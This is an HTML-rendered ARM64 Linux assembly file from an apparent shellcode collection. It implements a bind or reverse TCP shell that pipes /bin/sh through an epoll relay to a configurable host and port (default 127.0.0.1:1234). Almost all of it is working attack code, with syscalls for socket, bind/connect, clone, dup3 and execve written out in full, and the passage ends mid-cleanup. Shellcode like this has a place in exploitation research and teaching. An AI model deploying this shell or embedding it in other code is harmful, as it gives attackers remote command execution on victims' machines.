<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>/home/user/hub/shellcode/os/linux/arm64/sync.s.html</title>
<meta name="Generator" content="Vim/8.0">
<meta name="plugin-version" content="vim7.4_v2">
<meta name="syntax" content="armv4">
<meta name="settings" content="use_css,pre_wrap,no_foldcolumn,prevent_copy=">
<meta name="colorscheme" content="none">
<style type="text/css">
<!--
pre { white-space: pre-wrap; font-family: monospace; color: #000000; background-color: #ffffff; }
body { font-family: monospace; color: #000000; background-color: #ffffff; }
* { font-size: 1em; }
.Type { color: #008000; }
.Comment { color: #0000c0; }
.Constant { color: #c00000; }
.Identifier { color: #008080; }
.Statement { color: #af5f00; }
.PreProc { color: #c000c0; }
-->
</style>

<script type='text/javascript'>
<!--

-->
</script>
</head>
<body>
<pre id='vimCodeElement'>
 <span class="Comment">/**</span>
<span class="Comment">  Copyright Â© 2018 Odzhan. All Rights Reserved.</span>

  <span class="Identifier">Redistribution</span> <span class="Statement">and</span> <span class="Identifier">use</span> <span class="Identifier">in</span> <span class="Identifier">source</span> <span class="Statement">and</span> <span class="Identifier">binary</span> <span class="Identifier">forms</span><span class="Statement">,</span> <span class="Identifier">with</span> <span class="Identifier">or</span> <span class="Identifier">without</span>
  <span class="Identifier">modification</span><span class="Statement">,</span> <span class="Identifier">are</span> <span class="Identifier">permitted</span> <span class="Identifier">provided</span> <span class="Identifier">that</span> <span class="Identifier">the</span> <span class="Identifier">following</span> <span class="Identifier">conditions</span> <span class="Identifier">are</span>
  <span class="Identifier">met:</span>

  <span class="Constant">1.</span> <span class="Identifier">Redistributions</span> <span class="Identifier">of</span> <span class="Identifier">source</span> <span class="Identifier">code</span> <span class="Identifier">must</span> <span class="Identifier">retain</span> <span class="Identifier">the</span> <span class="Identifier">above</span> <span class="Identifier">copyright</span>
  <span class="Identifier">notice</span><span class="Statement">,</span> <span class="Identifier">this</span> <span class="Identifier">list</span> <span class="Identifier">of</span> <span class="Identifier">conditions</span> <span class="Statement">and</span> <span class="Identifier">the</span> <span class="Identifier">following</span> <span class="Identifier">disclaimer.</span>

  <span class="Constant">2.</span> <span class="Identifier">Redistributions</span> <span class="Identifier">in</span> <span class="Identifier">binary</span> <span class="Identifier">form</span> <span class="Identifier">must</span> <span class="Identifier">reproduce</span> <span class="Identifier">the</span> <span class="Identifier">above</span> <span class="Identifier">copyright</span>
  <span class="Identifier">notice</span><span class="Statement">,</span> <span class="Identifier">this</span> <span class="Identifier">list</span> <span class="Identifier">of</span> <span class="Identifier">conditions</span> <span class="Statement">and</span> <span class="Identifier">the</span> <span class="Identifier">following</span> <span class="Identifier">disclaimer</span> <span class="Identifier">in</span> <span class="Identifier">the</span>
  <span class="Identifier">documentation</span> <span class="Statement">and</span><span class="Statement">/</span><span class="Identifier">or</span> <span class="Identifier">other</span> <span class="Identifier">materials</span> <span class="Identifier">provided</span> <span class="Identifier">with</span> <span class="Identifier">the</span> <span class="Identifier">distribution.</span>

  <span class="Constant">3.</span> <span class="Identifier">The</span> <span class="Identifier">name</span> <span class="Identifier">of</span> <span class="Identifier">the</span> <span class="Identifier">author</span> <span class="Identifier">may</span> <span class="Identifier">not</span> <span class="Identifier">be</span> <span class="Identifier">used</span> <span class="Identifier">to</span> <span class="Identifier">endorse</span> <span class="Identifier">or</span> <span class="Identifier">promote</span> <span class="Identifier">products</span>
  <span class="Identifier">derived</span> <span class="Identifier">from</span> <span class="Identifier">this</span> <span class="Identifier">software</span> <span class="Identifier">without</span> <span class="Identifier">specific</span> <span class="Identifier">prior</span> <span class="Identifier">written</span> <span class="Identifier">permission.</span>

  <span class="Identifier">THIS</span> <span class="Identifier">SOFTWARE</span> <span class="Identifier">IS</span> <span class="Identifier">PROVIDED</span> <span class="Identifier">BY</span> <span class="Identifier">AUTHORS</span> <span class="Constant">&quot;AS IS&quot;</span> <span class="Statement">AND</span> <span class="Identifier">ANY</span> <span class="Identifier">EXPRESS</span> <span class="Identifier">OR</span>
  <span class="Identifier">IMPLIED</span> <span class="Identifier">WARRANTIES</span><span class="Statement">,</span> <span class="Identifier">INCLUDING</span><span class="Statement">,</span> <span class="Identifier">BUT</span> <span class="Identifier">NOT</span> <span class="Identifier">LIMITED</span> <span class="Identifier">TO</span><span class="Statement">,</span> <span class="Identifier">THE</span> <span class="Identifier">IMPLIED</span>
  <span class="Identifier">WARRANTIES</span> <span class="Identifier">OF</span> <span class="Identifier">MERCHANTABILITY</span> <span class="Statement">AND</span> <span class="Identifier">FITNESS</span> <span class="Identifier">FOR</span> <span class="Identifier">A</span> <span class="Identifier">PARTICULAR</span> <span class="Identifier">PURPOSE</span> <span class="Identifier">ARE</span>
  <span class="Identifier">DISCLAIMED.</span> <span class="Identifier">IN</span> <span class="Identifier">NO</span> <span class="Identifier">EVENT</span> <span class="Identifier">SHALL</span> <span class="Identifier">THE</span> <span class="Identifier">AUTHOR</span> <span class="Identifier">BE</span> <span class="Identifier">LIABLE</span> <span class="Identifier">FOR</span> <span class="Identifier">ANY</span> <span class="Identifier">DIRECT</span><span class="Statement">,</span>
  <span class="Identifier">INDIRECT</span><span class="Statement">,</span> <span class="Identifier">INCIDENTAL</span><span class="Statement">,</span> <span class="Identifier">SPECIAL</span><span class="Statement">,</span> <span class="Identifier">EXEMPLARY</span><span class="Statement">,</span> <span class="Identifier">OR</span> <span class="Identifier">CONSEQUENTIAL</span> <span class="Identifier">DAMAGES</span>
  (<span class="Identifier">INCLUDING</span><span class="Statement">,</span> <span class="Identifier">BUT</span> <span class="Identifier">NOT</span> <span class="Identifier">LIMITED</span> <span class="Identifier">TO</span><span class="Statement">,</span> <span class="Identifier">PROCUREMENT</span> <span class="Identifier">OF</span> <span class="Identifier">SUBSTITUTE</span> <span class="Identifier">GOODS</span> <span class="Identifier">OR</span>
  <span class="Identifier">SERVICES</span>; <span class="Identifier">LOSS</span> <span class="Identifier">OF</span> <span class="Identifier">USE</span><span class="Statement">,</span> <span class="Identifier">DATA</span><span class="Statement">,</span> <span class="Identifier">OR</span> <span class="Identifier">PROFITS</span>; <span class="Identifier">OR</span> <span class="Identifier">BUSINESS</span> <span class="Identifier">INTERRUPTION</span>)
  <span class="Identifier">HOWEVER</span> <span class="Identifier">CAUSED</span> <span class="Statement">AND</span> <span class="Identifier">ON</span> <span class="Identifier">ANY</span> <span class="Identifier">THEORY</span> <span class="Identifier">OF</span> <span class="Identifier">LIABILITY</span><span class="Statement">,</span> <span class="Identifier">WHETHER</span> <span class="Identifier">IN</span> <span class="Identifier">CONTRACT</span><span class="Statement">,</span>
  <span class="Identifier">STRICT</span> <span class="Identifier">LIABILITY</span><span class="Statement">,</span> <span class="Identifier">OR</span> <span class="Identifier">TORT</span> (<span class="Identifier">INCLUDING</span> <span class="Identifier">NEGLIGENCE</span> <span class="Identifier">OR</span> <span class="Identifier">OTHERWISE</span>) <span class="Identifier">ARISING</span> <span class="Identifier">IN</span>
  <span class="Identifier">ANY</span> <span class="Identifier">WAY</span> <span class="Identifier">OUT</span> <span class="Identifier">OF</span> <span class="Identifier">THE</span> <span class="Identifier">USE</span> <span class="Identifier">OF</span> <span class="Identifier">THIS</span> <span class="Identifier">SOFTWARE</span><span class="Statement">,</span> <span class="Identifier">EVEN</span> <span class="Identifier">IF</span> <span class="Identifier">ADVISED</span> <span class="Identifier">OF</span> <span class="Identifier">THE</span>
  <span class="Identifier">POSSIBILITY</span> <span class="Identifier">OF</span> <span class="Identifier">SUCH</span> <span class="Identifier">DAMAGE.</span> <span class="Statement">*/</span>

    <span class="PreProc">.arch</span> <span class="Identifier">armv8</span><span class="Statement">-</span><span class="Identifier">a</span>
    <span class="PreProc">.align</span> <span class="Constant">4</span>

    <span class="Comment">// default TCP port</span>
    <span class="PreProc">.equ</span> <span class="Identifier">PORT</span><span class="Statement">,</span> <span class="Constant">1234</span>

    <span class="Comment">// default host, 127.0.0.1</span>
    <span class="PreProc">.equ</span> <span class="Identifier">HOST</span><span class="Statement">,</span> <span class="Constant">0x0100007F</span>

    <span class="Comment">// comment out for a reverse connecting shell</span>
    <span class="PreProc">.equ</span> <span class="Identifier">BIND</span><span class="Statement">,</span> <span class="Constant">1</span>

    <span class="Comment">// comment out for code to behave as a function</span>
    <span class="PreProc">.equ</span> <span class="Identifier">EXIT</span><span class="Statement">,</span> <span class="Constant">1</span>

    <span class="PreProc">.include</span> <span class="Constant">&quot;include.inc&quot;</span>

    <span class="Comment">// structure for stack variables</span>

          <span class="PreProc">.struct</span> <span class="Constant">0</span>
    <span class="Identifier">p_in:</span> <span class="PreProc">.skip</span> <span class="Constant">8</span>
          <span class="PreProc">.equ</span> <span class="Identifier">in0</span><span class="Statement">,</span> <span class="Identifier">p_in</span> <span class="Statement">+</span> <span class="Constant">0</span>
          <span class="PreProc">.equ</span> <span class="Identifier">in1</span><span class="Statement">,</span> <span class="Identifier">p_in</span> <span class="Statement">+</span> <span class="Constant">4</span>

    <span class="Identifier">p_out:</span><span class="PreProc">.skip</span> <span class="Constant">8</span>
          <span class="PreProc">.equ</span> <span class="Identifier">out0</span><span class="Statement">,</span> <span class="Identifier">p_out</span> <span class="Statement">+</span> <span class="Constant">0</span>
          <span class="PreProc">.equ</span> <span class="Identifier">out1</span><span class="Statement">,</span> <span class="Identifier">p_out</span> <span class="Statement">+</span> <span class="Constant">4</span>

    <span class="Identifier">id:</span>   <span class="PreProc">.skip</span> <span class="Constant">8</span>
    <span class="Identifier">efd:</span>  <span class="PreProc">.skip</span> <span class="Constant">4</span>
    <span class="Identifier">s:</span>    <span class="PreProc">.skip</span> <span class="Constant">4</span>

    <span class="PreProc">.ifdef</span> <span class="Identifier">BIND</span>
    <span class="Identifier">s2:</span>   <span class="PreProc">.skip</span> <span class="Constant">8</span>
    <span class="PreProc">.endif</span>

    <span class="Identifier">evts:</span> <span class="PreProc">.skip</span> <span class="Constant">16</span>
          <span class="PreProc">.equ</span> <span class="Identifier">events</span><span class="Statement">,</span> <span class="Identifier">evts</span> <span class="Statement">+</span> <span class="Constant">0</span>
          <span class="PreProc">.equ</span> <span class="Identifier">data_fd</span><span class="Statement">,</span><span class="Identifier">evts</span> <span class="Statement">+</span> <span class="Constant">8</span>

    <span class="Identifier">buf:</span>  <span class="PreProc">.skip</span> <span class="Identifier">BUFSIZ</span>
    <span class="Identifier">ds_tbl_size:</span>

    <span class="PreProc">.global</span> <span class="Identifier">_start</span>
    <span class="PreProc">.text</span>
<span class="Identifier">_start:</span>
    <span class="Comment">// allocate memory for variables</span>
    <span class="Comment">// ensure data structure aligned by 16 bytes</span>
    <span class="Statement">sub</span>     <span class="Type">sp</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> (<span class="Identifier">ds_tbl_size</span> <span class="Statement">&amp;</span> <span class="Statement">-</span><span class="Constant">16</span>) <span class="Statement">+</span> <span class="Constant">16</span>

    <span class="Comment">// create pipes for stdin</span>
    <span class="Comment">// pipe2(in, 0);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_pipe2</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">xzr</span>
    <span class="Statement">add</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">p_in</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// create pipes for stdout + stderr</span>
    <span class="Comment">// pipe2(out, 0);</span>
    <span class="Statement">add</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">p_out</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// syscall(SYS_gettid);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_gettid</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
    <span class="Statement">str</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">id</span>]

    <span class="Comment">// clone(CLONE_CHILD_SETTID   | </span>
    <span class="Comment">//       CLONE_CHILD_CLEARTID | </span>
    <span class="Comment">//       SIGCHLD, 0, NULL, NULL, &amp;ctid)</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_clone</span>
    <span class="Statement">add</span>     <span class="Type">x4</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">id</span>           <span class="Comment">// ctid</span>
    <span class="Statement">mov</span>     <span class="Type">x3</span><span class="Statement">,</span> <span class="Type">xzr</span>              <span class="Comment">// newtls</span>
    <span class="Statement">mov</span>     <span class="Type">x2</span><span class="Statement">,</span> <span class="Type">xzr</span>              <span class="Comment">// ptid</span>
    <span class="Identifier">movl</span>    <span class="Type">x0</span><span class="Statement">,</span> (<span class="Identifier">CLONE_CHILD_SETTID</span> <span class="Statement">+</span> <span class="Identifier">CLONE_CHILD_CLEARTID</span> <span class="Statement">+</span> <span class="Identifier">SIGCHLD</span>)
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
    <span class="Statement">str</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">id</span>]         <span class="Comment">// save id</span>
    <span class="Identifier">cbnz</span>    <span class="Type">w0</span><span class="Statement">,</span> <span class="Identifier">opn_con</span>          <span class="Comment">// if already forked?</span>
                                 <span class="Comment">// open connection</span>
    <span class="Comment">// in this order..</span>
    <span class="Comment">//</span>
    <span class="Comment">// dup3 (out[1], STDERR_FILENO, 0);</span>
    <span class="Comment">// dup3 (out[1], STDOUT_FILENO, 0);</span>
    <span class="Comment">// dup3 (in[0],  STDIN_FILENO , 0);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_dup3</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">STDERR_FILENO</span> <span class="Statement">+</span> <span class="Constant">1</span>
    <span class="Statement">ldr</span>     <span class="Type">w3</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">in0</span>]
    <span class="Statement">ldr</span>     <span class="Type">w4</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">out1</span>]
<span class="Identifier">c_dup:</span>
    <span class="Statement">subs</span>    <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">x1</span><span class="Statement">,</span> <span class="Constant">1</span>
    <span class="Comment">// w0 = (x1 == 0) ? in[0] : out[1];</span>
    <span class="Statement">csel</span>    <span class="Type">w0</span><span class="Statement">,</span> <span class="Type">w3</span><span class="Statement">,</span> <span class="Type">w4</span><span class="Statement">,</span> <span class="Statement">eq</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
    <span class="Identifier">cbnz</span>    <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">c_dup</span>

    <span class="Comment">// close pipe handles in this order..</span>
    <span class="Comment">//</span>
    <span class="Comment">// close(in[0]);</span>
    <span class="Comment">// close(in[1]);</span>
    <span class="Comment">// close(out[0]);</span>
    <span class="Comment">// close(out[1]);</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Constant">4</span><span class="Statement">*</span><span class="Constant">4</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
<span class="Identifier">cls_pipe:</span>
    <span class="Statement">sub</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">x1</span><span class="Statement">,</span> <span class="Constant">4</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Type">x1</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
    <span class="Identifier">cbnz</span>    <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">cls_pipe</span>

    <span class="Comment">// execve(&quot;/bin/sh&quot;, NULL, NULL);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_execve</span>
    <span class="Identifier">movq</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">BINSH</span>
    <span class="Statement">str</span>     <span class="Type">x0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Statement">-</span><span class="Constant">16</span>]<span class="Statement">!</span>
    <span class="Statement">mov</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Type">sp</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
<span class="Identifier">opn_con:</span>
    <span class="Comment">// close(in[0]);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">in0</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// close(out[1]);</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">out1</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_socket</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">SOCK_STREAM</span>
    <span class="Statement">mov</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">AF_INET</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Statement">mov</span>     <span class="Type">x2</span><span class="Statement">,</span> <span class="Constant">16</span>      <span class="Comment">// x2 = sizeof(sin)</span>
    <span class="Statement">str</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>] <span class="Comment">// w0 = s</span>
<span class="PreProc">.ifdef</span> <span class="Identifier">BIND</span>
    <span class="Identifier">movl</span>    <span class="Type">w1</span><span class="Statement">,</span> (((((<span class="Identifier">PORT</span> <span class="Statement">&amp;</span> <span class="Constant">0xFF</span>) <span class="Statement">&lt;&lt;</span> <span class="Constant">8</span>) <span class="Statement">|</span> (<span class="Identifier">PORT</span> <span class="Statement">&gt;&gt;</span> <span class="Constant">8</span>)) <span class="Statement">&lt;&lt;</span> <span class="Constant">16</span>) <span class="Statement">|</span> <span class="Identifier">AF_INET</span>)
    <span class="Statement">str</span>     <span class="Type">x1</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Statement">-</span><span class="Constant">16</span>]<span class="Statement">!</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">sp</span>
    <span class="Comment">// bind (s, &amp;sa, sizeof(sa));</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_bind</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
    <span class="Statement">add</span>     <span class="Type">sp</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Constant">16</span>
    <span class="Identifier">cbnz</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">cls_sck</span>  <span class="Comment">// if(x0 != 0) goto cls_sck</span>

    <span class="Comment">// listen (s, 1);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_listen</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Constant">1</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// accept (s, 0, 0);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_accept</span>
    <span class="Statement">mov</span>     <span class="Type">x2</span><span class="Statement">,</span> <span class="Type">xzr</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">xzr</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Statement">ldr</span>     <span class="Type">w1</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]      <span class="Comment">// load binding socket</span>
    <span class="Statement">stp</span>     <span class="Type">w0</span><span class="Statement">,</span> <span class="Type">w1</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
    <span class="Statement">mov</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Type">xzr</span>
<span class="PreProc">.else</span>
    <span class="Identifier">movq</span>    <span class="Type">x1</span><span class="Statement">,</span> ((<span class="Identifier">HOST</span> <span class="Statement">&lt;&lt;</span> <span class="Constant">32</span>) <span class="Statement">|</span> (((((<span class="Identifier">PORT</span> <span class="Statement">&amp;</span> <span class="Constant">0xFF</span>) <span class="Statement">&lt;&lt;</span> <span class="Constant">8</span>) <span class="Statement">|</span> (<span class="Identifier">PORT</span> <span class="Statement">&gt;&gt;</span> <span class="Constant">8</span>)) <span class="Statement">&lt;&lt;</span> <span class="Constant">16</span>) <span class="Statement">|</span> <span class="Identifier">AF_INET</span>))
    <span class="Statement">str</span>     <span class="Type">x1</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Statement">-</span><span class="Constant">16</span>]<span class="Statement">!</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">sp</span>
    <span class="Comment">// connect (s, &amp;sa, sizeof(sa));</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_connect</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
    <span class="Statement">add</span>     <span class="Type">sp</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Constant">16</span>
    <span class="Identifier">cbnz</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">cls_sck</span>      <span class="Comment">// if(x0 != 0) goto cls_sck</span>
<span class="PreProc">.endif</span>
    <span class="Comment">// efd = epoll_create1(0);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_epoll_create1</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
    <span class="Statement">str</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]

    <span class="Comment">// epoll_ctl(efd, EPOLL_CTL_ADD, fd, &amp;evts);</span>
    <span class="Statement">ldr</span>     <span class="Type">w2</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
    <span class="Statement">ldr</span>     <span class="Type">w4</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">out0</span>]
<span class="Identifier">poll_init:</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_epoll_ctl</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">EPOLL_CTL_ADD</span>
    <span class="Statement">add</span>     <span class="Type">x3</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">evts</span>
    <span class="Statement">stp</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">x2</span><span class="Statement">,</span> [<span class="Type">x3</span>]
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
    <span class="Statement">cmp</span>     <span class="Type">w2</span><span class="Statement">,</span> <span class="Type">w4</span>
    <span class="Statement">mov</span>     <span class="Type">w2</span><span class="Statement">,</span> <span class="Type">w4</span>
    <span class="Statement">bne</span>     <span class="Identifier">poll_init</span>
    <span class="Comment">// now loop until user exits or some other error</span>
<span class="Identifier">poll_wait:</span>
    <span class="Comment">// epoll_pwait(efd, &amp;evts, 1, -1, NULL);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_epoll_pwait</span>
    <span class="Statement">mov</span>     <span class="Type">x4</span><span class="Statement">,</span> <span class="Type">xzr</span>              <span class="Comment">// sigmask   = NULL</span>
    <span class="Statement">mvn</span>     <span class="Type">x3</span><span class="Statement">,</span> <span class="Type">xzr</span>              <span class="Comment">// timeout   = -1</span>
    <span class="Statement">mov</span>     <span class="Type">x2</span><span class="Statement">,</span> <span class="Constant">1</span>                <span class="Comment">// maxevents = 1</span>
    <span class="Statement">add</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">evts</span>         <span class="Comment">// *events   = &amp;evts</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]        <span class="Comment">// epfd      = efd</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// if (r &lt; 0) break;</span>
    <span class="Identifier">tbnz</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Constant">31</span><span class="Statement">,</span> <span class="Identifier">cls_efd</span>

    <span class="Comment">// if (!(evts.events &amp; EPOLLIN)) break;</span>
    <span class="Statement">ldp</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Type">x1</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">evts</span>]
    <span class="Identifier">tbz</span>     <span class="Type">w0</span><span class="Statement">,</span> <span class="Constant">0</span><span class="Statement">,</span> <span class="Identifier">cls_efd</span>

    <span class="Statement">ldr</span>     <span class="Type">w3</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
    <span class="Statement">ldp</span>     <span class="Type">w5</span><span class="Statement">,</span> <span class="Type">w4</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">in1</span>]

    <span class="Statement">cmp</span>     <span class="Type">w1</span><span class="Statement">,</span> <span class="Type">w3</span>

    <span class="Comment">// r = (fd == s) ? s : out[0];</span>
    <span class="Statement">csel</span>    <span class="Type">w0</span><span class="Statement">,</span> <span class="Type">w3</span><span class="Statement">,</span> <span class="Type">w4</span><span class="Statement">,</span> <span class="Statement">eq</span>

    <span class="Comment">// w = (fd == s) ? in[1] : s;</span>
    <span class="Statement">csel</span>    <span class="Type">w3</span><span class="Statement">,</span> <span class="Type">w5</span><span class="Statement">,</span> <span class="Type">w3</span><span class="Statement">,</span> <span class="Statement">eq</span>

    <span class="Comment">// read(r, buf, BUFSIZ);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_read</span>
    <span class="Statement">mov</span>     <span class="Type">x2</span><span class="Statement">,</span> <span class="Identifier">BUFSIZ</span>
    <span class="Statement">add</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">buf</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
    <span class="Identifier">cbz</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">cls_efd</span>

    <span class="Comment">// encrypt/decrypt buffer</span>

    <span class="Comment">// write(w, buf, len);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_write</span>
    <span class="Statement">mov</span>     <span class="Type">w2</span><span class="Statement">,</span> <span class="Type">w0</span>
    <span class="Statement">mov</span>     <span class="Type">w0</span><span class="Statement">,</span> <span class="Type">w3</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
    <span class="Statement">b</span>       <span class="Identifier">poll_wait</span>
<span class="Identifier">cls_efd:</span>
    <span class="Comment">// epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_epoll_ctl</span>
    <span class="Statement">mov</span>     <span class="Type">x3</span><span class="Statement">,</span> <span class="Type">xzr</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">EPOLL_CTL_DEL</span>
    <span class="Statement">ldp</span>     <span class="Type">w0</span><span class="Statement">,</span> <span class="Type">w2</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);</span>
    <span class="Statement">ldr</span>     <span class="Type">w2</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">out0</span>]
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]
